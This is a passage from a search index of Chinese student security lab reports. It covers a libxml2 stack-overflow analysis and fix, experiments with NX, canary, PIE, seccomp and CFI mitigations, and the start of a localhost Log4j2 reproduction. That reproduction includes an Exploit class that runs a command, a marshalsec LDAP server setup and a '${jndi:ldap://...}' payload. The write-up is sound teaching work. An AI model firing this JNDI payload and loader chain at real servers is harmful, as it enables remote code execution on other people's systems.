if (size - len &lt; xmlStrlen(content-&gt;name) + 10) {\n                strcat(buf, \" ...\");\n                return;\n            }\n            if (content-&gt;name != NULL)\n                strcat(buf, (char *) content-&gt;name);\n            break;\n        case XML_ELEMENT_CONTENT_SEQ:\n            ...\n        case XML_ELEMENT_CONTENT_OR:\n            ...\n    }\n    if (englob)\n        strcat(buf, \")\");\n</code></pre> <p>\u8fd9\u91cc\u5728\u8fdb\u884c strcat \u4e4b\u524d\u4f1a\u8fdb\u884c size - len\uff08\u5373\u5269\u4f59\u7a7a\u95f4\uff09\u4e0e\u5199\u5165\u957f\u5ea6 + 10 \u7684\u6bd4\u8f83\uff0c\u7a7a\u95f4\u4e0d\u8db3\u5219\u76f4\u63a5\u586b\u5165\u7701\u7565\u53f7\uff0c\u540e\u7eed\u4e0d\u518d\u6dfb\u52a0\u4efb\u4f55\u5185\u5bb9\u3002\u8fd9\u91cc\u7684 len \u5e94\u8be5\u662f\u5df2\u7ecf\u6dfb\u52a0\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\uff0c\u4f46\u8fd9\u91cc len \u53ea\u5728\u51fd\u6570\u6700\u5f00\u5934\u8d4b\u503c\u4e3a\u4e86 strlen(buf) \u5373 buf \u5df2\u6709\u957f\u5ea6\uff0c\u540e\u7eed\u5e76\u6ca1\u6709\u66f4\u65b0\uff0c\u6240\u4ee5\u5373\u4f7f\u4f1a\u51fa\u73b0\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\u4e5f\u4f1a\u7ee7\u7eed\u586b\u5165\uff0c\u9020\u6210\u6808\u6ea2\u51fa\u3002</p> <p>\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u60c5\u51b5\uff0c\u5373 8 \u4e2a A : 4990 \u4e2a A\u3002\u8fd9\u91cc\u7684\u8c03\u7528\u5728\u4e4b\u524d\u7684\u62a5\u9519\u6808\u4e2d\u53ef\u4ee5\u627e\u5230\u662f xmlSnprintfElementContent(&amp;expr[0], 5000, cont, 1)\u3002\u800c expr[0] \u5df2\u7ecf\u8bbe\u4e3a\u4e86 0\uff0c\u6240\u4ee5 len \u4e3a 0\u3002\u9996\u5148\u5199\u5165\u4e00\u4e2a\u5de6\u62ec\u53f7\uff0c\u6b64\u65f6 buf \u5df2\u6709 1 \u4e2a\u5b57\u7b26\uff0c\u7136\u540e size - len = 5000 &gt;= 8 + 10\uff0c\u5c06 prefix\uff08\u5373 8 \u4e2a A\uff09\u62fc\u5165 buf\uff0c\u6b64\u65f6\u6709 9 \u4e2a\u5b57\u7b26\uff0c\u518d\u52a0\u4e00\u4e2a\u5192\u53f7\u4e00\u5171 10 \u4e2a\u5b57\u7b26\u3002</p> <p>\u63a5\u4e0b\u6765 size - len = 5000 &gt;= 4990 + 10\uff0c\u5c06 content\uff084990 \u4e2a A\uff09\u62fc\u5165 buf\uff0c\u6b64\u65f6\u5728\u62fc\u63a5\u7684\u65f6\u5019\u4f1a\u5199\u5165 buf[5000]\uff08\u56e0\u4e3a\u5199\u5165\u540e\u6709 5000 \u4e2a\u5b57\u7b26\u4e86\uff09\uff0c\u6240\u4ee5\u4f1a\u5728 strcat(buf, (char *)content-&gt;name) \u7684\u65f6\u5019\u53d1\u751f\u6808\u6ea2\u51fa\u3002</p>"},{"location":"sec/softsec/lab3/#crash_3","title":"Crash \u4fee\u590d","text":"<p>\u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u53ea\u9700\u8981\u5728 strcat \u4e4b\u540e\u66f4\u65b0 len \u5373\u53ef\uff0c\u6216\u8005\u5c06 len \u5168\u90e8\u66ff\u6362\u4e3a strlen(buf) \u5b9e\u65f6\u8ba1\u7b97\u5df2\u6709\u957f\u5ea6\u3002</p> <p>\u4fee\u6539\u4e4b\u540e\u91cd\u65b0\u7f16\u8bd1 libxml2\uff0c\u8fd0\u884c\u4e4b\u524d crash \u7684\u6837\u4f8b\uff1a</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc expecting \u540e\u9762\u6210\u529f\u53d1\u73b0\u5269\u4f59\u7a7a\u95f4\u4e0d\u8db3\uff0c\u5728\u5192\u53f7\u540e\u9762\u76f4\u63a5\u586b\u5165\u4e86\u7701\u7565\u53f7\uff0c\u6ca1\u6709\u53d1\u751f\u6808\u6ea2\u51fa\u3002</p>"},{"location":"sec/softsec/lab4/","title":"\u8f6f\u4ef6\u5b89\u5168\u673a\u5236","text":"<p> \u7ea6 1332 \u4e2a\u5b57  22 \u884c\u4ee3\u7801  12 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u8f6f\u4ef6\u5b89\u5168 lab4 \u5b9e\u9a8c\u62a5\u544a\uff082023.06.10 ~ 2023.07.02\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/softsec/lab4/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>Task 1: No eXecute bit<ul> <li>\u4f7f\u7528 NX bit enable/disable \u5206\u522b\u7f16\u8bd1 sbof2</li> <li>\u4f7f\u7528 checksec \u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790</li> <li>\u4f7f\u7528 lab-01 \u7b54\u6848\u7684\u672c\u5730\u653b\u51fb\u811a\u672c\u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb</li> <li>\u622a\u56fe\u3001\u8bf4\u660e\u4e8c\u8005\u7684\u5dee\u5f02\uff0c\u89e3\u8bfb\u62a5\u9519\u4fe1\u606f</li> </ul> </li> <li>Task 2: Canary<ul> <li>\u4f7f\u7528 canary enable/disable \u5206\u522b\u7f16\u8bd1 sbof1</li> <li>\u4f7f\u7528 checksec \u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790</li> <li>\u4f7f\u7528 lab-01 \u7b54\u6848\u7684\u672c\u5730\u653b\u51fb\u811a\u672c\u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb</li> <li>\u622a\u56fe\u3001\u8bf4\u660e\u4e8c\u8005\u7684\u5dee\u5f02\uff0c\u89e3\u8bfb\u62a5\u9519\u4fe1\u606f</li> <li>\u5bf9 sbof1-harden \u8fdb\u884c\u9006\u5411\uff0c\u5bf9\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u51fd\u6570\u9996\u5c3e\u90e8\u5206\u8fdb\u884c\u53cd\u6c47\u7f16\u5206\u6790</li> <li>\u753b\u51fa\u5f00\u542f canary \u4e0e\u4e0d\u5f00\u542f\u7684\u6808\u7ed3\u6784</li> <li>\u5728\u62a5\u544a\u4e2d\u56de\u7b54 canary \u4f4e\u4f4d\u4e3a 0 \u7684\u539f\u56e0</li> </ul> </li> <li>Task 3: PIE<ul> <li>\u4f7f\u7528 PIE enable/disable \u5206\u522b\u7f16\u8bd1 sbof1</li> <li>\u4f7f\u7528 checksec \u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790</li> <li>\u4f7f\u7528 lab-01 \u7b54\u6848\u7684\u672c\u5730\u653b\u51fb\u811a\u672c\u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb</li> <li>\u622a\u56fe\u3001\u8bf4\u660e\u4e8c\u8005\u7684\u5dee\u5f02\uff0c\u89e3\u8bfb\u62a5\u9519\u4fe1\u606f</li> <li>\u7f16\u5199\u4e00\u4e2a\u6253\u5370 main \u5730\u5740\u7684\u7a0b\u5e8f\uff0c\u6bd4\u8f83\u5f00\u542f PIE \u4e0e\u4e0d\u5f00\u542f\u7684 main \u5730\u5740<ul> <li>\u6ce8\u610f\u5730\u5740\u968f\u673a\u5316\u7684\u7c92\u5ea6</li> </ul> </li> </ul> </li> <li>Task 4: SECCOMP<ul> <li>\u5b89\u88c5 seccomp \u76f8\u5173\u5e93\u548c\u5de5\u5177\uff0c\u7f16\u8bd1 ban.c \u548c no-ban.c</li> <li>\u4f7f\u7528 checksec \u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790</li> <li>\u4f7f\u7528 seccomp-tools \u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790</li> </ul> </li> <li>Task Bonus: CFI<ul> <li>\u4f7f\u7528 CFI enable/disable \u5206\u522b\u7f16\u8bd1 password</li> <li>\u4f7f\u7528 checksec \u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790</li> <li>\u5206\u522b\u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u8fdb\u884c\u653b\u51fb\uff0c\u8bf4\u660e\u5dee\u5f02\uff0c\u5bf9\u62a5\u9519\u4fe1\u606f\u8fdb\u884c\u89e3\u8bfb</li> <li>\u5bf9\u4e24\u4e2a\u7a0b\u5e8f\u7684 main \u51fd\u6570\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u5bf9\u6bd4\u5206\u6790\u54ea\u4e9b\u63a7\u5236\u6d41\u8fb9\u88ab\u52a0\u56fa\uff0c\u54ea\u4e9b\u6ca1\u6709</li> </ul> </li> </ul>"},{"location":"sec/softsec/lab4/#no-execute-bit","title":"No eXecute bit","text":"<p>\u5173\u95ed NX \u7f16\u8bd1 sbof2\uff0cchecksec\uff0c\u653b\u51fb\uff1a</p> <p></p> <p>\u5f00\u542f NX \u7f16\u8bd1 sbof2\uff0cchecksec\uff0c\u653b\u51fb\uff1a</p> <p></p> <p>NX disabled \u60c5\u51b5\u4e0b\u653b\u51fb\u6b63\u5e38\uff0cenabled \u65f6\u7a0b\u5e8f\u63d0\u524d\u629b\u51fa SIGSEGV\uff0c\u5373\u6bb5\u9519\u8bef\uff0c\u53cd\u6620\u4e86\u6808\u4e0a\u6570\u636e\u6bb5\u6ca1\u6709\u6267\u884c\u6743\u9650\uff0c\u88ab\u7981\u6b62\u6240\u4ee5\u629b\u51fa\u6bb5\u9519\u8bef\u3002</p>"},{"location":"sec/softsec/lab4/#canary","title":"Canary","text":"<p>\u5173\u95ed Canary \u7f16\u8bd1 sbof1\uff0cchecksec\uff0c\u653b\u51fb\uff1a</p> <p></p> <p>\u5f00\u542f Canary \u7f16\u8bd1 sbof1\uff0cchecksec\uff0c\u653b\u51fb\uff1a</p> <p></p> <p>Canary disabled \u60c5\u51b5\u4e0b\u653b\u51fb\u6b63\u5e38\uff0cenabled \u65f6\u7a0b\u5e8f\u6253\u5370\u51fa <code>*** stack smashing detected ***: terminated</code>\uff0c\u68c0\u6d4b\u5230\u4e86\u6808\u6ea2\u51fa\u7834\u574f\u4e86 canary\uff0c\u629b\u51fa\u4e86 SIGABRT \u7ec8\u6b62\u7a0b\u5e8f\uff0c\u653b\u51fb\u5931\u8d25\u3002</p> <p>\u4f7f\u7528 objdump \u770b\u4e00\u4e0b func \u51fd\u6570\u9996\u5c3e\u90e8\u5206\u7684\u53cd\u6c47\u7f16\uff1a</p> <pre><code>000000000040123f &lt;func&gt;:\n  40123f:       f3 0f 1e fa             endbr64 \n  401243:       55                      push   rbp\n  401244:       48 89 e5                mov    rbp,rsp\n  401247:       48 83 ec 60             sub    rsp,0x60\n  40124b:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28\n  401252:       00 00 \n  401254:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax\n  ...\n  4012c3:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]\n  4012c7:       64 48 2b 04 25 28 00    sub    rax,QWORD PTR fs:0x28\n  4012ce:       00 00 \n  4012d0:       74 05                   je     4012d7 &lt;func+0x98&gt;\n  4012d2:       e8 e9 fd ff ff          call   4010c0 &lt;__stack_chk_fail@plt&gt;\n  4012d7:       c9                      leave  \n  4012d8:       c3                      ret\n</code></pre> <p>\u51fd\u6570\u5f00\u5934\u5148\u5c06 fs:0x28 \u7684\u503c\u4fdd\u5b58\u5230\u6808\u4e0a [rbp-0x8]\uff0c\u5373\u53d6\u51fa\u8fdb\u7a0b\u5bf9\u5e94\u7684 canary \u653e\u5728\u6808\u4e0a\u3002\u51fd\u6570\u7ed3\u5c3e\u53d6\u51fa\u6808\u4e0a [rbp-0x8] \u7684\u503c\uff0c\u4e0e fs:0x28 \u7684\u503c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u7b49\u5219\u8df3\u8f6c leave ret\uff0c\u5426\u5219\u8c03\u7528 __stack_chk_fail \u6253\u5370 detected \u4fe1\u606f\u5e76\u629b\u51fa ABORT \u4fe1\u53f7\u3002</p> <p>\u6240\u4ee5\u5f00\u4e0d\u5f00\u542f canary \u6808\u4e0a\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <p></p> <p>Canary \u7684\u4f4e\u4f4d\u4e00\u5b9a\u4e3a 0\uff0c\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u5728\u5c06\u5c40\u90e8\u53d8\u91cf\u5f53\u4f5c\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u65f6\u5019\uff0c\u5373\u4f7f\u672b\u5c3e\u6ca1\u6709 \\0 \u4e5f\u4e00\u5b9a\u4f1a\u5728\u8f93\u51fa canary \u5185\u5bb9\u524d\u622a\u65ad\uff0c\u907f\u514d\u65e0\u610f\u6cc4\u9732 canary \u7684\u503c\u3002</p>"},{"location":"sec/softsec/lab4/#pie","title":"PIE","text":"<p>PIE disabled \u7684\u60c5\u51b5\u548c\u524d\u9762 Canary disabled \u7684\u4e00\u6837\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u653e\u622a\u56fe\u4e86\u3002</p> <p>PIE enabled \u7684\u7f16\u8bd1\u3001checksec\u3001\u653b\u51fb\uff1a</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u8dd1\u51fa\u4e86 SIGSEGV \u6bb5\u9519\u8bef\uff0c\u8bf4\u660e\u6211\u4eec\u4fee\u6539 return address \u7684\u5730\u5740\u4e0d\u518d\u662f\u540e\u95e8\u7684\u5730\u5740\uff0c\u800c\u662f\u4e0d\u53ef\u6267\u884c\u7684\u6bb5\uff0c\u6240\u4ee5\u7a0b\u5e8f\u629b\u51fa\u4e86\u6bb5\u9519\u8bef\uff0c\u53ef\u4ee5\u770b\u51fa main \u51fd\u6570\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\u3002</p> <p>\u518d\u5199\u4e00\u4e2a\u7a0b\u5e8f\u6253\u5370 main \u5730\u5740\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"main: %p\\n\", main);\n    return 0;\n}\n</code></pre> <p>\u5728\u4e24\u79cd\u60c5\u51b5\u4e0b\u8fdb\u884c\u7f16\u8bd1\u8fd0\u884c\uff1a</p> <p>\u53ef\u4ee5\u53d1\u73b0\u6ca1\u5f00\u542f PIE \u7684\u60c5\u51b5\u4e0b\u8f93\u51fa\u7684 main \u51fd\u6570\u5730\u5740\u90fd\u662f 0x401136\uff0c\u800c\u5f00\u542f PIE \u540e\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u4e0d\u540c\u3002\u540c\u65f6\u4e5f\u53ef\u4ee5\u53d1\u73b0\uff0c\u5f00\u542f PIE \u540e\u5730\u5740\u90fd\u662f 0x5????????149\uff0c\u8bf4\u660e\u4f4e 12 \u4f4d\u662f\u4e0d\u53d8\u7684\u3002</p>"},{"location":"sec/softsec/lab4/#seccomp","title":"SECCOMP","text":"<p>\u6309\u7167\u5b9e\u9a8c\u6307\u5bfc\u5b89\u88c5\u597d\u5e93\u548c\u5de5\u5177\uff0c\u7f16\u8bd1 no-ban.c\u3001checksec\u3001seccomp-tools dump\uff1a</p> <p></p> <p>\u7f16\u8bd1 ban.c\u3001checksec\u3001seccomp-tools dump\uff1a</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u4e8c\u8005 checksec \u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u6ee1\u4fdd\u62a4\uff08gcc \u7f16\u8bd1\u9ed8\u8ba4\u5f00\u542f\uff09\u3002ban \u7a0b\u5e8f\u4e0d\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u56e0\u4e3a\u6709 invalid system call\u3002\u5728 seccomp-tools dump \u7684\u65f6\u5019 no-ban \u7a0b\u5e8f\u56e0\u4e3a\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u6240\u4ee5\u6ca1\u6709\u8f93\u51fa\u4efb\u4f55 seccomp \u76f8\u5173\u4fe1\u606f\u3002\u800c ban \u7a0b\u5e8f\u8bbe\u7f6e\u4e86 seccomp\uff0c\u5728 dump \u7684\u65f6\u5019\u8f93\u51fa\u4e86 seccomp \u76f8\u5173\u903b\u8f91\u7684\u53cd\u6c47\u7f16\uff0c\u5373\u67b6\u6784\u4e0d\u662f x86_64 \u5c31\u7ec8\u6b62\uff0c\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a execve \u7684\u60c5\u51b5\u4e0b kill\uff0c\u5176\u4ed6\u60c5\u51b5\u4e0b allow\u3002</p>"},{"location":"sec/softsec/lab4/#cfi","title":"CFI","text":"<p>\u5bf9\u4e24\u4e2a\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f checksec\uff1a</p> <p></p> <p>\u53d1\u73b0\u4fdd\u62a4\u90fd\u4e00\u6837\u3002\u7136\u540e\u8fdb\u884c\u653b\u51fb\uff08\u516b\u4e2a A \u5360\u6ee1 pass\uff0c\u7136\u540e\u5199\u5165\u5730\u5740\u8986\u76d6 func\uff09\uff1a</p> <p></p> <p>\u53d1\u73b0\u6ca1\u5f00\u542f CFI \u7684\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u8986\u76d6 func \u5230 success\uff0c\u800c\u5f00\u542f\u4e86 CFI \u7684\u7a0b\u5e8f\u4f1a\u629b\u51fa illegal hardware instruction \u7ec8\u6b62\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\u3002</p> <p>\u5728 IDA \u4e2d\u6253\u5f00\u53cd\u6c47\u7f16\uff0c\u89c2\u5bdf\u4e24\u4e2a\u7a0b\u5e8f\u7684 main \u51fd\u6570\uff08\u5de6\u5f00\u542f\u53f3\u5173\u95ed\uff09\uff1a</p> <p>\u53ef\u4ee5\u53d1\u73b0\u5728 scanf \u4e4b\u524d\u7684\u90e8\u5206\u9664\u4e86\u6808\u7ed3\u6784\u6709\u7565\u5fae\u5dee\u522b\u4e4b\u5916\u90fd\u5b8c\u5168\u76f8\u540c\u3002\u5728 scanf \u540e\u8981\u8c03\u7528 a.func\uff0c\u8fd9\u65f6\u6ca1\u5f00\u542f CFI \u7684\u7a0b\u5e8f\u76f4\u63a5\u8c03\u7528\u8df3\u8f6c\u5230\u4e86\u6808\u4e0a\u5b58\u7684\u5730\u5740\u3002\u800c\u5f00\u542f\u4e86 CFI \u7684\u7a0b\u5e8f\u5148\u5c06\u76ee\u7684\u5730\u5740\u4e0e auth \u51fd\u6570\u5730\u5740\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\u5219 call\uff0c\u5426\u5219\u6267\u884c\u4e00\u6761 ud2 \u6307\u4ee4\uff0c\u629b\u51fa illegal hardware instruction \u7ec8\u6b62\u7a0b\u5e8f\u3002</p> <p>\u6240\u4ee5\u8c03\u7528 a.func \u7684\u63a7\u5236\u6d41\u8fb9\u88ab\u52a0\u56fa\u4e86\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u77e5\u9053\u8fd9\u91cc\u53ef\u80fd\u4f1a\u88ab\u4fee\u6539\uff0c\u800c\u4e14\u53ea\u5e94\u8be5\u8df3\u8f6c\u5230 auth \u51fd\u6570\u7684\u5730\u5740\uff0c\u6240\u4ee5\u52a0\u4e86\u4e00\u5c42\u68c0\u67e5\u3002\u800c\u8c03\u7528 printf scanf \u7b49\u51fd\u6570\u7684\u63a7\u5236\u6d41\u8fb9\u90fd\u6ca1\u6709\u88ab\u52a0\u56fa\uff0c\u56e0\u4e3a\u8fd9\u91cc\u4e0d\u4f1a\u88ab\u4fee\u6539\u3002</p>"},{"location":"sec/syssec/","title":"\u7cfb\u7edf\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u7cfb\u7edf\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5\u201d \u8bfe\u7a0b\u5b9e\u9a8c\u62a5\u544a\u5f52\u6863</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u7cfb\u7edf\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5</li> </ul>"},{"location":"sec/syssec/#table-of-contents","title":"Table of Contents","text":"<ul> <li>lab1: Apache Log4j2 \u6f0f\u6d1e\u89e6\u53d1</li> <li>lab2: Linux \u5185\u6838 ROP \u653b\u51fb\u4e0e\u9632\u62a4</li> <li>lab3: Linux \u5185\u6838 JOP \u653b\u51fb\u4e0e\u9632\u62a4</li> <li>\u5927\u4f5c\u4e1a\uff1a\u5185\u6838 eBPF \u6280\u672f\u7b80\u4ecb\u4e0e\u5b89\u5168\u6f0f\u6d1e\u5206\u6790</li> </ul>"},{"location":"sec/syssec/lab1/","title":"Apache Log4j2 \u6f0f\u6d1e\u89e6\u53d1","text":"<p> \u7ea6 1638 \u4e2a\u5b57  110 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u7cfb\u7edf\u5b89\u5168 lab1 \u5b9e\u9a8c\u62a5\u544a\uff0c\u5b9e\u9a8c\u4e0e\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u8bfe\u7a0b\u62a5\u544a\u9009\u9898\u91cd\u5408\uff0c\u5927\u90e8\u5206\u53c2\u8003 log4j \u6f0f\u6d1e\u590d\u73b0</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"sec/syssec/lab1/#_1","title":"\u5b9e\u9a8c\u76ee\u6807","text":"<ul> <li>\u7406\u89e3 Apache Log4j2 \u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u638c\u63e1 Log4j2 \u6f0f\u6d1e\u7684\u89e6\u53d1</li> <li>\u52a0\u6df1\u5bf9\u8f6f\u4ef6\u4f9b\u5e94\u94fe\u5b89\u5168\u7684\u7406\u89e3</li> </ul>"},{"location":"sec/syssec/lab1/#_2","title":"\u5b9e\u9a8c\u8fc7\u7a0b","text":"<p>\u7531\u4e8e\u672c\u4eba\u5728\u5927\u4e00\u6625\u590f\u5b66\u671f\u7684\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u8bfe\u4e0a\u9009\u62e9\u4e86 log4j \u6f0f\u6d1e\u590d\u73b0\u4e0e\u5206\u6790\u4f5c\u4e3a\u8bfe\u7a0b\u62a5\u544a\uff0c\u6240\u4ee5\u672c\u5b9e\u9a8c\u6709\u5f88\u591a\u53c2\u8003\u4e86\u5f53\u65f6\u672c\u4eba\u7684\u62a5\u544a\u5185\u5bb9\u3002\u5f53\u65f6\u7684\u62a5\u544a\u53ef\u89c1\uff1ahttps://note.tonycrane.cc/sec/vulns/log4j/\u3002</p>"},{"location":"sec/syssec/lab1/#task-1","title":"Task 1\uff1a\u672c\u5730\u89e6\u53d1","text":"<p>\u9996\u5148\u6784\u5efa Exploit \u811a\u672c\uff0c\u53ea\u9700\u8981\u901a\u8fc7 java.lang.Runtime.getRuntime().exec(cmds).waitFor(); \u6267\u884c\u4efb\u610f\u547d\u4ee4\u5373\u53ef\uff0c\u7531\u4e8e\u6211\u662f macOS \u73af\u5883\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7 open /System/Applications/Calculator.app \u6765\u6253\u5f00\u8ba1\u7b97\u5668\uff1a</p> <pre><code>public class Exploit {\n    static {\n        System.out.println(\"Executing exploit!\");\n        System.out.println(\"Attack!\");\n        try {\n            String[] cmds = {\"open\", \"/System/Applications/Calculator.app\"};\n            java.lang.Runtime.getRuntime().exec(cmds).waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\u5728\u540c\u4e00\u76ee\u5f55\u4e2d\u901a\u8fc7 python -m http.server 8100 \u6765\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 curl -I 127.0.0.1:8100/Exploit.class \u6765\u9a8c\u8bc1\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u5230\u8be5\u6587\u4ef6\u3002</p> <p>\u7136\u540e\u9700\u8981\u5728\u672c\u5730\u8d77\u4e00\u4e2a LDAP \u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 marshalsec \u9879\u76ee\u6765\u8fdb\u884c\u642d\u5efa\uff1a</p> <pre><code>git clone https://github.com/mbechler/marshalsec.git\nmvn clean package -DskipTests\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8100/#Exploit\"\n</code></pre> <p>\u63a5\u4e0b\u6765\u5b8c\u5584\u670d\u52a1\u7a0b\u5e8f\uff0c\u8fdb\u884c log4j2 \u7684 log\uff1a</p> <pre><code>package com;\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class Log4j {\n    private static final Logger LOGGER = LogManager.getLogger(Log4j.class);\n    public static void main(String[] args) {\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n        LOGGER.error(\"${jndi:ldap://127.0.0.1:1389/Exploit}\");\n    }\n}\n</code></pre> <p>\u7136\u540e\u5728 Log4j2Vul/Log4j2Ldap \u6587\u4ef6\u5939\u4e2d\u6784\u5efa\u5e76\u8fd0\u884c\uff1a</p> <pre><code>cd Log4j2Vul/Log4j2Ldap\nmvn clean package\njava -jar target/lab-0.0.1-SNAPSHOT.jar\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u5728\u8fd0\u884c\u7684\u65f6\u5019\u670d\u52a1\u7a0b\u5e8f\u8fdb\u884c\u4e86 error \u8bb0\u5f55\uff0c\u5728\u8f93\u51fa\u7684\u65f6\u5019\u8bbf\u95ee\u4e86\u8be5 LDAP \u670d\u52a1\uff0cLDAP \u670d\u52a1\u5c06\u672c\u6b21 python HTTP \u670d\u52a1\u7684 Exploit.class \u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u4ece\u800c\u89e6\u53d1\u4e86 Exploit.java \u4e2d\u7684\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u6253\u5f00\u4e86\u8ba1\u7b97\u5668\u5b9e\u73b0\u4e86 RCE\u3002\u5177\u4f53\u6d41\u7a0b\u540e\u7eed\u601d\u8003\u9898\u4e2d\u5206\u6790\u3002</p>"},{"location":"sec/syssec/lab1/#task-2","title":"Task 2\uff1a\u9879\u76ee\u4e2d\u89e6\u53d1","text":"<p>\u5148\u914d\u7f6e mysql \u73af\u5883\uff0c\u6211\u4f7f\u7528 docker \u6765\u8fd0\u884c mysql\uff1a</p> <pre><code>docker pull mysql:latest\ndocker run -it -d --name mysql_syssec -p 3306:3306 -e MYSQL_ROOT_PASSWORD=aaaaaa mysql\ndocker exec -it mysql_syssec bash\n</code></pre> <p>\u8fdb\u5165 docker \u540e\u901a\u8fc7 cat &gt; /wj.sql \u5c06 wj.sql \u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u8fdb\u5165\u6570\u636e\u5e93\uff1a</p> <pre><code>bash-5.1# mysql -h localhost -u root -p\nEnter password: aaaaaa\n...\nmysql&gt; create DATABASE wj;\nQuery OK, 1 row affected (0.01 sec)\n\nmysql&gt; use wj;\nDatabase changed\nmysql&gt; source /wj.sql\n</code></pre> <p>\u5373\u53ef\u5b8c\u6210\u6570\u636e\u5e93\u7684\u914d\u7f6e\u3002</p> <p>\u63a5\u4e0b\u6765\u4fee\u6539 White-Jotter/src/main/resources/application.properties \u4e2d\u7684\u6570\u636e\u5e93\u914d\u7f6e\uff1a</p> <pre><code>spring.datasource.url=jdbc:mysql://localhost:3306/wj?characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8\nspring.datasource.username=root\nspring.datasource.password=aaaaaa\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\n</code></pre> <p>\u63a5\u4e0b\u6765\u6784\u5efa\u5e76\u8fd0\u884c\u9879\u76ee\uff1a</p> <pre><code>cd White-Jotter\nmvn clean package\ncd target\njava -jar wj-1.0.0.war\n</code></pre> <p>\u53d1\u73b0 localhost:8443/login \u5e76\u4e0d\u80fd\u6b63\u5e38\u8bbf\u95ee\uff0c\u62a5\u9519\u4e3a\u627e\u4e0d\u5230\u5bf9\u5e94\u7684 index.html\u3002\u53d1\u73b0 resources \u6587\u4ef6\u5939\u4e2d\u5185\u5bb9\u4e0d\u5bf9\uff0c\u9700\u8981\u5c06 White-Jotter/public \u6587\u4ef6\u5939\u62f7\u8d1d\u5230 src/main/resources \u4e0b\uff0c\u7136\u540e\u91cd\u65b0\u6784\u5efa\u5e76\u8fd0\u884c\u9879\u76ee\uff0c\u5373\u53ef\u6210\u529f\u8bbf\u95ee\u3002\u8f93\u5165 admin/123 